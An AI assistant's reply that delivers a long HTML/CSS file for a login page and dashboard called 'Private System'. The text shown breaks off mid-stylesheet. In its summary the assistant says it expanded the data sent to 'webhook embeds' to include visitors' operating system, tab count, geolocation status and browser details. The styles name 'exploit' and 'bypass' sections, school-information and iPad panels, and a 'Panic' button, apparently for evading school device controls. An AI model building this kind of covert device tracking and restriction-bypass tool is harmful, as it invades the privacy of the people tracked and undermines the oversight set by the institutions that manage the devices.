Okay, this is a significant number of requests. I'll integrate these changes into the provided code step-by-step.

Here's the updated HTML, CSS, and JavaScript, incorporating all your requests for the login page and dashboard. Due to the extensive nature of some requests (e.g., resizing/moving panels requiring complex UI libraries like `interact.js`), I've provided the foundation and a simpler implementation where full library integration might be beyond a single file solution.

I've made the following design decisions and assumptions for clarity and practicality:

**Login Page:**
*   **Loading Screens (1, 3):** Added a pre-loader (`pre-login-loader`) before the login page appears. It includes the rotating box and the gradient text animations. After successful login, a new loading screen (`post-login-loader`) with a similar 3D box (as a loading spinner) and "pieces of code" animation is shown before transitioning to the dashboard.
*   **Login Page Redesign (2):** Applied styling changes for more square, rounded corners to the `.login-box`.
*   **Time/Date Box (2):** Added below the login form with a 24-hour format toggle.
*   **Show Password Toggle (2):** Replaced the checkbox with a visually distinct toggle switch that turns green.
*   **Login Page Quick Bar (2):** Added above the login form with "Panic," "Zoom In," and "Zoom Out" buttons.
*   **Attempt Counter (2):** Reduced from 5 to 3.
*   **Welcome Notification (3):** Implemented as a dismissible alert box in the top-right of the dashboard after successful login.

**Dashboard:**
*   **Quickbar Restructure (D1, D2, D18):**
    *   The primary quick-bar (`dashboard-quick-bar`) now contains the **Search Bar**, **Download Activity Logs**, **Panic**, **Zoom In/Out**, **Settings**, **Themes**, **Log Out**.
    *   Many buttons that were previously in the `quick-bar` are now moved into a new **Dashboard Utilities** panel, accessible via a dedicated button. This panel (`dashboard-utilities-panel`) includes: Session Time, Real-time Clock, Real Date, Notes, Export Notes, Screenshot, Toggle Sections, Fix Issues, Full Screen, Restart, Activity Logs, Login History, Keybinds, Timer, Stopwatch, Calculator, Unit Converter, Stats, Media, Reminders. This consolidates utilities into a more organized section.
*   **Panel Resizing/Moving (D3):** For resizing, I've used CSS `resize: both; overflow: auto;` on some panels for a basic resizeable functionality. Full drag-and-drop requires advanced JavaScript which is not included for brevity, but a placeholder for an `interact.js` library has been added as a comment to guide a future implementation.
*   **Settings Option (D4):** Added a "Settings" button to the main dashboard quick-bar. The `settingsPanel` has been created with an expanded set of 15 practical options (including some duplicates from earlier requests for clarity on consolidation).
*   **Notes Pad Enhancements (D5):** The notes canvas now includes buttons for thickness, color, background "material" (pre-defined options), a toggle for text notes mode, Undo/Redo, and Save/Load.
*   **Keybinds (D6):** Added a "Keybinds" button in the `Dashboard Utilities` panel and a `keybindsPanel` where users could define them (current implementation is placeholder for custom assignment).
*   **Timer, Stopwatch, Reminder (D7, D15):** Integrated a `Time Tools` panel with a Timer, Stopwatch, and Reminders, all utilizing the dashboard's new alert system.
*   **Activity Logs (D8):** An "Activity Logs" button in the `Dashboard Utilities` panel now leads to an `activityLogPanel` that records and displays user interactions (button clicks, panel toggles, etc.) from *both* login and dashboard. This also applies to the login attempts which will show there.
*   **Login History (D9):** A "Login History" button in the `Dashboard Utilities` panel. A `loginHistoryPanel` stores and displays the last login attempt with date and time using `localStorage`.
*   **More Themes (D10):** Added "Themes" button to main quickbar and a `themesPanel` with multiple theme options, changing a class on the body.
*   **Random Facts & Daily Quotes (D11):** New `factBox` and `quoteBox` panels dynamically loading content.
*   **Calculator & Unit Converter (D12):** Added buttons to `Dashboard Utilities` leading to `calculatorPanel` and `unitConverterPanel`.
*   **Stats Button (D13):** Added a "Stats" button to `Dashboard Utilities` leading to a `statsPanel` that tracks simple user interactions (button clicks, panel opens/closes).
*   **Media Button (D14):** A "Media" button in `Dashboard Utilities` opens a panel with an embedded YouTube player, placeholder for proxy.
*   **Logging Information (D16):** Added several more logging fields to the webhook embeds, like Operating System, Active Tab Count (estimate), Geolocation Status, and more specific connection and browser details where available. I made sure to add *new* distinct fields that were not extensively covered already.
*   **WiFi Panel Colors (D17):** Adjusted the CSS to style "High", "Medium", "Low" WiFi levels with green, yellow, and red colors.

---

Here is the full, updated code:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0; padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      color: #fff;
      overflow: hidden; /* Prevent scroll on initial load/loading screens */
    }

    /* Pre-Login Loading Screen */
    #preLoginLoader, #postLoginLoader {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      width: 100%;
      background: #000;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1000;
    }

    .cube-loader {
      perspective: 120px; /* Adjust perspective for better 3D effect */
      transform-style: preserve-3d;
      margin-bottom: 30px;
    }

    .cube-loader-inner {
      width: 80px;
      height: 80px;
      transform-style: preserve-3d;
      animation: rotateCube 4s infinite linear;
      position: relative;
    }

    .cube-face {
      position: absolute;
      width: 80px;
      height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border: 1px solid rgba(255, 255, 255, 0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.8em;
      color: rgba(255, 255, 255, 0.7);
    }

    .cube-face.front  { transform: rotateY(0deg) translateZ(40px); }
    .cube-face.back   { transform: rotateX(180deg) translateZ(40px); }
    .cube-face.right  { transform: rotateY(90deg) translateZ(40px); }
    .cube-face.left   { transform: rotateY(-90deg) translateZ(40px); }
    .cube-face.top    { transform: rotateX(90deg) translateZ(40px); }
    .cube-face.bottom { transform: rotateX(-90deg) translateZ(40px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    #loaderText {
      font-size: 2em;
      font-weight: bold;
      animation: gradientText 3s infinite linear alternate;
    }

    @keyframes gradientText {
      0%   { color: orange; }
      50%  { color: darkorange; }
      100% { color: red; }
    }

    /* Login Page Specific Styles */
    body.login-active {
      display: flex;
      height: 100vh; /* Ensure login screen fills height after loaders */
      align-items: center;
      justify-content: center;
      background: #000;
      color: #fff;
      overflow: hidden; /* Keep hidden to manage transitions */
    }

    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
    }

    .login-quick-bar {
      display: flex;
      justify-content: center;
      gap: 10px;
      padding: 10px;
      border-radius: 12px;
      background: #333;
      margin-bottom: 20px;
    }

    .login-quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 8px 12px;
      border-radius: 6px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .login-quick-bar button:hover {
      background-color: #ffb67a;
    }

    .login-box {
      background: #000;
      border-radius: 15px; /* More rounded corners */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 400px; /* Slightly wider */
      padding: 30px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.5s ease-out; /* Added transform transition */
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.8em; /* Slightly larger */
      margin-bottom: 25px;
      font-family: 'Courier New', monospace;
      color: #ff914d; /* System name colored */
    }
    
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: calc(100% - 24px); /* Account for padding */
      padding: 14px;
      margin-bottom: 18px; /* More space */
      background: #1c1c1c;
      border: 1px solid #555; /* Subtle border */
      color: white;
      border-radius: 8px;
      font-size: 1.05em;
    }

    .password-toggle-container {
      display: flex;
      align-items: center;
      justify-content: flex-start; /* Align to left */
      margin-bottom: 20px; /* More space */
      gap: 10px;
      cursor: pointer;
    }

    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 45px; /* Slightly larger switch */
      height: 25px;
    }

    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 25px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 19px;
      width: 19px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #2ecc71; /* Green when checked */
    }

    input:checked + .slider:before {
      transform: translateX(20px);
    }
    
    .login-box button {
      width: 100%;
      padding: 15px; /* Taller button */
      background-color: red;
      color: white;
      font-size: 1.1em;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }

    .login-box button:hover {
      background-color: #e60000;
      transform: translateY(-2px);
    }

    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.95em;
      color: red;
      font-weight: bold;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Real-time Clock and Date Box for Login Page */
    .login-info-box {
      background: #1c1c1c;
      border: 1px solid #555;
      border-radius: 10px;
      padding: 10px 15px;
      margin-top: 20px;
      font-size: 0.9em;
      color: #ccc;
      display: flex;
      flex-direction: column;
      gap: 5px;
      align-items: flex-start;
      width: 400px;
    }

    .login-info-box span {
        margin-left: 5px;
    }

    .login-info-box .time-date-toggle {
        display: flex;
        align-items: center;
        margin-top: 5px;
        gap: 8px;
    }

    .login-info-box .time-date-toggle label {
        margin: 0;
    }

    /* Post-Login Loading "Dashboard Initializing" */
    #dashboardLoader {
        display: none; /* Hidden by default */
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000;
        z-index: 999;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        color: white;
        font-size: 1.8em;
    }

    .dashboard-loading-box {
        animation: rotateCube 4s infinite linear;
        margin-bottom: 30px;
    }

    .dashboard-loading-code {
        width: 300px;
        height: 80px;
        border: 2px solid #0f0;
        border-radius: 5px;
        overflow: hidden;
        position: relative;
        margin-top: 20px;
        background: #111;
    }

    .code-line {
        position: absolute;
        height: 2px;
        background: linear-gradient(to right, transparent, #0f0, transparent);
        animation: codeFlow 2s infinite linear;
    }

    .code-line:nth-child(1) { top: 10%; width: 60%; left: -60%; animation-delay: 0s; }
    .code-line:nth-child(2) { top: 30%; width: 80%; left: -80%; animation-delay: 0.5s; }
    .code-line:nth-child(3) { top: 50%; width: 70%; left: -70%; animation-delay: 1s; }
    .code-line:nth-child(4) { top: 70%; width: 50%; left: -50%; animation-delay: 1.5s; }
    .code-line:nth-child(5) { top: 90%; width: 90%; left: -90%; animation-delay: 0.2s; }

    @keyframes codeFlow {
        0% { left: -100%; }
        100% { left: 100%; }
    }
    
    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; /* Retain zoom for global scaling */
      height: auto; /* Allow dashboard to take natural height */
      overflow-y: auto; /* Enable scrolling for dashboard */
      display: block; /* Change display from flex to block for standard flow */
    }

    /* Dashboard Themes */
    body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }
    body.light-theme .login-box {
      background: #f9f2dc;
      color: #1a1a1a;
      border-color: #555;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }
    body.light-theme .login-box h2,
    body.light-theme .login-quick-bar button,
    body.light-theme .box h2,
    body.light-theme .info-panel h2,
    body.light-theme .school-info-label {
      color: #ff914d;
    }
    body.light-theme .login-box input {
      background: #eee;
      color: #1a1a1a;
      border-color: #aaa;
    }
    body.light-theme .login-quick-bar { background: #eee; }
    body.light-theme .box {
      background-color: #e0e0e0;
      color: #1a1a1a;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
    }
    body.light-theme .quick-bar button,
    body.light-theme .dashboard-quick-actions button,
    body.light-theme .announcement-bar,
    body.light-theme .update-entry,
    body.light-theme .calendar div,
    body.light-theme #notesCanvas,
    body.light-theme #canvasControls button,
    body.light-theme .info-panel,
    body.light-theme .wifi-grid div,
    body.light-theme .wifi-entry div,
    body.light-theme .handbook-buttons a,
    body.light-theme .links-list a,
    body.light-theme .exploit-buttons a,
    body.light-theme .bypass-buttons button,
    body.light-theme .coming-soon,
    body.light-theme .info-text,
    body.light-theme .school-info-item,
    body.light-theme .ipad-options button,
    body.light-theme .ipad-content,
    body.light-theme .bypass-content {
      background-color: #ffd966;
      color: #000;
    }
    body.light-theme .today {
      background: #994d00 !important;
      color: #ffd966;
    }
    body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Added themes */
    body.vibrant-theme {
      background-color: #3f0a59;
      color: #ccff00;
    }
    body.vibrant-theme .login-box { border-color: #ccff00; box-shadow: 0 0 15px #ccff00; }
    body.vibrant-theme .login-quick-bar { background: #2b083c; }
    body.vibrant-theme .login-quick-bar button, body.vibrant-theme .dashboard-header { background: #8a00ff; color: #ccff00; }
    body.vibrant-theme .box, body.vibrant-theme .info-panel, body.vibrant-theme .motivation-box { background: #2b083c; box-shadow: 0 0 15px rgba(138, 0, 255, 0.5); }
    body.vibrant-theme .box h2, body.vibrant-theme .info-panel h2, body.vibrant-theme .school-info-label { color: #ccff00; }
    body.vibrant-theme .quick-bar button, body.vibrant-theme .dashboard-quick-actions button, body.vibrant-theme .update-entry, body.vibrant-theme .calendar div { background: #8a00ff; color: #ccff00; }
    body.vibrant-theme .today { background: #ff007f !important; color: #ccff00; }

    body.corporate-theme {
        background-color: #f0f2f5;
        color: #333;
    }
    body.corporate-theme .login-box { background: #fff; border-color: #ccc; box-shadow: 0 0 15px rgba(0,0,0,0.1); color: #333; }
    body.corporate-theme .login-quick-bar { background: #e0e0e0; }
    body.corporate-theme .login-quick-bar button, body.corporate-theme .dashboard-header { background: #007bff; color: #fff; }
    body.corporate-theme .box, body.corporate-theme .info-panel, body.corporate-theme .motivation-box { background: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.05); color: #333; }
    body.corporate-theme .box h2, body.corporate-theme .info-panel h2, body.corporate-theme .school-info-label { color: #007bff; }
    body.corporate-theme .quick-bar button, body.corporate-theme .dashboard-quick-actions button, body.corporate-theme .update-entry, body.corporate-theme .calendar div { background: #007bff; color: #fff; }
    body.corporate-theme .today { background: #0056b3 !important; color: #fff; }

    body.forest-theme {
      background-color: #2e8b57; /* Sea Green */
      color: #fffacd; /* Lemon Chiffon */
    }
    body.forest-theme .login-box { border-color: #f0e68c; box-shadow: 0 0 15px #f0e68c; background: #3cb371; }
    body.forest-theme .login-quick-bar { background: #226b41; }
    body.forest-theme .login-quick-bar button, body.forest-theme .dashboard-header { background: #5cb85c; color: #000; }
    body.forest-theme .box, body.forest-theme .info-panel, body.forest-theme .motivation-box { background: #3cb371; box-shadow: 0 0 15px rgba(92, 184, 92, 0.5); }
    body.forest-theme .box h2, body.forest-theme .info-panel h2, body.forest-theme .school-info-label { color: #fffacd; }
    body.forest-theme .quick-bar button, body.forest-theme .dashboard-quick-actions button, body.forest-theme .update-entry, body.forest-theme .calendar div { background: #5cb85c; color: #000; }
    body.forest-theme .today { background: #4cae4c !important; color: #000; }

    body.midnight-theme {
      background-color: #2c3e50; /* Darker blue-grey */
      color: #ecf0f1; /* Lighter grey */
    }
    body.midnight-theme .login-box { border-color: #3498db; box-shadow: 0 0 15px #3498db; background: #34495e; }
    body.midnight-theme .login-quick-bar { background: #233140; }
    body.midnight-theme .login-quick-bar button, body.midnight-theme .dashboard-header { background: #3498db; color: #fff; }
    body.midnight-theme .box, body.midnight-theme .info-panel, body.midnight-theme .motivation-box { background: #34495e; box-shadow: 0 0 15px rgba(52, 152, 219, 0.5); }
    body.midnight-theme .box h2, body.midnight-theme .info-panel h2, body.midnight-theme .school-info-label { color: #3498db; }
    body.midnight-theme .quick-bar button, body.midnight-theme .dashboard-quick-actions button, body.midnight-theme .update-entry, body.midnight-theme .calendar div { background: #3498db; color: #fff; }
    body.midnight-theme .today { background: #2980b9 !important; color: #fff; }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }

    .dashboard-quick-bar { /* Primary dashboard quickbar */
      display: flex;
      justify-content: space-between; /* Adjusted to fit search bar */
      align-items: center; /* Center items vertically */
      gap: 12px;
      margin-bottom: 20px;
      padding: 10px 20px;
      background: #2a2a2a;
      border-radius: 12px;
      flex-wrap: wrap; /* Allow wrapping */
    }

    .dashboard-quick-bar .search-container {
      display: flex;
      flex-grow: 1; /* Allow search to take available space */
      max-width: 300px;
      gap: 5px;
    }

    .dashboard-quick-bar input[type="text"] {
      flex-grow: 1;
      padding: 8px 12px;
      border-radius: 6px;
      border: 1px solid #555;
      background: #1c1c1c;
      color: white;
      font-size: 0.9em;
    }
    
    .dashboard-quick-bar input[type="text"]::placeholder {
      color: #aaa;
    }

    .dashboard-quick-bar button, .dashboard-quick-actions button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      white-space: nowrap;
      flex-shrink: 0; /* Prevent buttons from shrinking too much */
    }

    .dashboard-quick-bar button:hover, .dashboard-quick-actions button:hover {
      background-color: #ffb67a;
    }

    #panicBtn, .alert-panic-button {
      background: #ff4c4c !important;
      color: white !important;
    }

    /* Notification box */
    .dashboard-notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: rgba(50, 205, 50, 0.9); /* LimeGreen */
      color: white;
      padding: 15px 20px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transform: translateX(100%);
      transition: all 0.5s ease-out;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .dashboard-notification.show {
      opacity: 1;
      visibility: visible;
      transform: translateX(0);
    }

    .dashboard-notification button {
        background: none;
        border: none;
        color: white;
        font-size: 1.2em;
        cursor: pointer;
        padding: 0 5px;
    }


    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s;
      flex: 1 1 300px;
      position: relative; /* Needed for resizing handle */
      resize: both; /* Allow resizing */
      overflow: auto; /* Handle overflow when resizing */
      min-width: 250px;
      max-width: 100%; /* Ensure it doesn't expand indefinitely */
    }

    /* Fixed size for some utility panels, not necessarily resizable */
    #calculatorPanel, #unitConverterPanel, #timerStopwatchPanel {
        min-width: 350px;
        max-width: 450px;
        flex: 0 1 400px;
    }


    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    /* Random Fact and Daily Quote panels */
    .fact-quote-box {
        background-color: #333;
        color: #f9f2dc;
        padding: 20px;
        border-radius: 12px;
        font-style: italic;
        font-size: 15px;
        box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 120px;
        text-align: center;
        position: relative;
        resize: both;
        overflow: auto;
    }

    .fact-quote-box h2 {
        font-size: 16px;
        margin-top: 0;
        color: #ffbf80;
    }

    /* Notes Canvas Container and Controls */
    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background: #2a2a2a; /* Match box background */
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      resize: both; /* Resizable */
      overflow: auto;
      max-width: 90%;
      min-width: 400px;
      margin: 20px auto; /* Center the container */
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      display: block; /* Ensure it takes full width of container, if desired */
      margin: 0 auto 10px auto; /* Center canvas within its container */
    }

    #canvasControls {
      margin-top: 15px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 100px;
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    #textNoteInput {
      width: calc(100% - 20px);
      margin-top: 10px;
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #1c1c1c;
      color: white;
      display: none; /* Hidden by default */
    }

    #noteColorPicker {
      margin-left: 5px;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      width: 40px;
      height: 25px;
      background-color: transparent;
      border: none;
      cursor: pointer;
      padding: 0;
    }
    #noteColorPicker::-webkit-color-swatch {
      border-radius: 50%;
      border: none;
    }
    #noteColorPicker::-webkit-color-swatch-wrapper {
      padding: 0;
    }

    #noteThicknessSlider {
        width: 120px;
        margin: 0 10px;
        -webkit-appearance: none;
        height: 8px;
        background: #ddd;
        border-radius: 5px;
        outline: none;
        opacity: 0.7;
        transition: opacity .2s;
    }

    #noteThicknessSlider:hover {
        opacity: 1;
    }

    #noteThicknessSlider::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: #ff914d;
        cursor: pointer;
    }

    #noteMaterialSelect {
      padding: 8px 12px;
      border-radius: 8px;
      border: none;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      cursor: pointer;
    }

    /* Info Panel Styles (and new utility panels) */
    .info-panel, .settings-panel, .dashboard-quick-actions-panel, .activity-log-panel, .login-history-panel,
    .keybinds-panel, .themes-panel, #calculatorPanel, #unitConverterPanel, #timerStopwatchPanel,
    .stats-panel, .media-panel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      position: relative; /* For moving */
      resize: both; /* Allow resizing */
      overflow: auto; /* Handle overflow when resizing */
      min-width: 300px;
      max-width: 90%;
      margin-left: auto;
      margin-right: auto;
    }
    
    .info-panel h2, .settings-panel h2, .dashboard-quick-actions-panel h2, .activity-log-panel h2,
    .login-history-panel h2, .keybinds-panel h2, .themes-panel h2,
    #calculatorPanel h2, #unitConverterPanel h2, #timerStopwatchPanel h2,
    .stats-panel h2, .media-panel h2 {
      color: #ff914d;
      margin-bottom: 15px;
    }

    .info-grid { /* General grid for settings, history etc. */
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
    }

    .info-grid-item {
        background: #40210f;
        padding: 10px 15px;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }

    .info-grid-item label {
        margin: 0;
        flex-grow: 1;
        cursor: default;
    }
    .info-grid-item input[type="checkbox"] {
        width: auto;
        margin-bottom: 0;
    }

    /* Styles for switches in info grids */
    .info-grid-item .toggle-switch {
        width: 35px;
        height: 20px;
        margin-left: 10px;
    }
    .info-grid-item .toggle-switch .slider {
        border-radius: 20px;
    }
    .info-grid-item .toggle-switch .slider:before {
        height: 16px;
        width: 16px;
        left: 2px;
        bottom: 2px;
    }
    .info-grid-item .toggle-switch input:checked + .slider:before {
        transform: translateX(15px);
    }
    .info-grid-item select, .info-grid-item input[type="text"] {
        background-color: #1c1c1c;
        border: 1px solid #555;
        color: white;
        padding: 6px;
        border-radius: 5px;
        margin-left: 10px;
    }


    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }
    
    /* WiFi Signal Color Coding */
    .wifi-entry .high-signal { background-color: #28a745; } /* Green */
    .wifi-entry .medium-signal { background-color: #ffc107; } /* Yellow */
    .wifi-entry .low-signal { background-color: #dc3545; } /* Red */
    .wifi-entry .other-signal { background-color: #6c757d; } /* Grey for others/unknown */


    .handbook-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons a, .links-list a, .exploit-buttons a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover {
      background-color: #ffb67a;
    }

    .links-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .bypass-buttons button:hover {
      background-color: #ffb67a;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    /* Keybinds Panel Specifics */
    .keybind-entry {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: #1c1c1c;
        padding: 8px 15px;
        border-radius: 8px;
        margin-bottom: 10px;
    }

    .keybind-key {
        background: #333;
        padding: 5px 10px;
        border-radius: 5px;
        min-width: 50px;
        text-align: center;
        margin-left: 10px;
    }

    .keybind-action {
      flex-grow: 1;
      text-align: left;
    }

    /* Timer/Stopwatch/Reminders */
    .timer-controls, .reminder-controls {
        display: flex;
        gap: 10px;
        margin-top: 10px;
        flex-wrap: wrap;
    }
    .timer-controls button, .reminder-controls button {
        background-color: #ff914d;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .timer-display {
        font-size: 2.5em;
        font-weight: bold;
        margin: 20px 0;
        text-align: center;
        width: 100%;
        color: #0f0; /* Green for timers */
    }
    .reminder-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .reminder-entry .close-btn {
        background: none;
        border: none;
        color: #ffccb3;
        cursor: pointer;
        font-size: 1.2em;
        margin-left: 10px;
    }

    /* Calculator and Unit Converter */
    .calculator-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
        margin-top: 15px;
    }
    .calculator-display {
        grid-column: 1 / -1;
        background: #1c1c1c;
        color: white;
        padding: 10px;
        border-radius: 8px;
        font-size: 2em;
        text-align: right;
        min-height: 50px;
    }
    .calculator-grid button {
